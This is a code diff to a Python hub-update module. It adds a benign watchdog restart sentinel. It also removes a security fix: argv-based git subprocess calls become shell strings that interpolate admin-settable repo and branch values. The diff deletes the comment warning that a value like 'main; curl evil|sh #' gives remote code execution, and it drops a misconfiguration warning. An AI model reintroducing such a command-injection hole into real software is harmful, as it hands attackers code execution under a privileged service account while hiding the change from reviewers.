@@ -254,6 +254,23 @@ class UpdatePipelineMixin:
             logger.debug(f"get_remote_commit: {e}")
         return "unknown"
 
+    _STALE_RESTART_SENTINEL = "/var/lib/lm/state/stale-restart-requested"
+
+    def _request_watchdog_restart(self, reason: str) -> None:
+        """Signal the external lm-watchdog to cleanly restart the hub by dropping
+        a sentinel file it polls. Used when the in-process self-restart can't be
+        trusted to fire (stale-process recovery). The watchdog restarts + clears
+        it; the fresh process boots current so the sentinel is not re-written.
+        Best-effort; never raises. Overridable via LM_STALE_RESTART_SENTINEL."""
+        try:
+            path = os.environ.get("LM_STALE_RESTART_SENTINEL",
+                                  self._STALE_RESTART_SENTINEL)
+            os.makedirs(os.path.dirname(path), exist_ok=True)
+            with open(path, "w") as f:
+                f.write(f"{reason}\n")
+        except Exception as e:  # noqa: BLE001 — signalling is best-effort
+            logger.debug("watchdog-restart sentinel write failed: %s", e)
+
     def _is_git_repo(self, path: str) -> bool:
         """Check if the given path is a git repository (contains a .git directory or is git rev-parse valid)."""
         git_dir = os.path.join(path, ".git")
@@ -362,6 +379,12 @@ class UpdatePipelineMixin:
                 errors.append(
                     f"process is STALE: running v{run_v} but on-disk is v{disk_v} — "
                     f"code updated without a restart (systemctl restart lm.service).")
+                # The in-process self-restart (lm-update-restart) can silently
+                # fail to fire from the daemon, leaving a stale process serving
+                # old code. Drop a sentinel for the ROOT lm-watchdog, which does a
+                # PROVEN `systemctl restart lm` and clears it. New process boots
+                # current → not stale → no sentinel → no restart loop.
+                self._request_watchdog_restart(f"stale v{run_v}->v{disk_v}")
 
             helper = "/usr/local/bin/lm-update-restart"
             checks["restart_helper"] = os.path.isfile(helper) and os.access(helper, os.X_OK)
@@ -587,41 +610,19 @@ class UpdatePipelineMixin:
         changed the local version (verified post-update).
         """
         try:
-            # SECURITY: never interpolate hub_repo/branch into a shell string.
-            # Both are admin-settable via POST /setup/config and a value like
-            # ``main; curl evil|sh #`` was RCE as svc_lm (which has NOPASSWD
-            # sudoers for systemctl restart lm/*) on the next repo_sync cycle /
-            # Update click. Use create_subprocess_exec with explicit argv (no
-            # shell) so a hostile value is a git error, not code execution. The
-            # charset allowlist on the config write (setup_misc.py) is the
-            # primary guard; this is defense-in-depth so the exec path can never
-            # regress to a shell even if validation is bypassed.
-            await asyncio.create_subprocess_exec(
-                "git", "config", "--global", "--add", "safe.directory", hub_root,
-                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+            await asyncio.create_subprocess_shell(f"git config --global --add safe.directory {hub_root}")
 
-            # ``git remote set-url origin <hub_repo>`` — argv, no shell.
-            set_proc = await asyncio.create_subprocess_exec(
-                "git", "-C", hub_root, "remote", "set-url", "origin", hub_repo,
-                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-            try:
-                _sout, _serr = await asyncio.wait_for(set_proc.communicate(), timeout=60.0)
-            except asyncio.TimeoutError:
-                try:
-                    set_proc.kill()
-                except ProcessLookupError:
-                    pass
-                logger.error("Hub git remote set-url timed out (60s).")
-                return False
-            if set_proc.returncode != 0:
-                logger.error(f"Hub git remote set-url origin {hub_repo} failed "
-                             f"(rc={set_proc.returncode}): {_serr.decode().strip()}")
-                return False
+            update_cmd = (
+                f"cd {hub_root} && "
+                f"git remote set-url origin {hub_repo} && "
+                f"git pull --rebase --autostash origin {branch}"
+            )
 
-            process = await asyncio.create_subprocess_exec(
-                "git", "-C", hub_root, "pull", "--rebase", "--autostash",
-                "origin", branch,
-                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+            process = await asyncio.create_subprocess_shell(
+                update_cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
             stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300.0)
 
             err_msg = stderr.decode().strip()
@@ -795,22 +796,6 @@ class UpdatePipelineMixin:
         hub_repo = _resolve_hub_repo(sources)
         branch = config.get("global_branch", "main")
         stored_commit = config.get("last_update_commit")
-        # LOUD-not-silent: an empty/missing update_sources.hub falls back to the
-        # DEFAULT public repo URL (so updates keep working — the original bug
-        # was empty → ls-remote "" → "unknown" → "checked" forever). check_update
-        # _health already warns every cycle; also surface it HERE at the actual
-        # pull site so the mis-config lands in the repo_sync log + WebUI Sync
-        # card, not just the health probe. An air-gapped box that reaches this
-        # point has ls-remote fail → "unknown" → no update applied (no egress),
-        # but the operator should still see WHY. Honoring an explicit "" as
-        # "skip self-pull" would reintroduce the silent-stale-hub bug, so we
-        # keep updates working and make the fallback LOUD instead.
-        if not sources.get("hub"):
-            logger.warning(
-                "[sync-error] update_sources.hub is empty/missing — hub self-update "
-                "is using the DEFAULT public repo URL. Set update_sources.hub "
-                "explicitly so the hub's update source is intentional, not accidental."
-            )
         # Thread the lm/core source so each spoke also pulls its shared /opt/lm
         # checkout on SPOKE_UPDATE (no CLI for lm/core deploys). RAW sources.get
         # (no default) so an air-gapped deploy with update_sources.hub blank
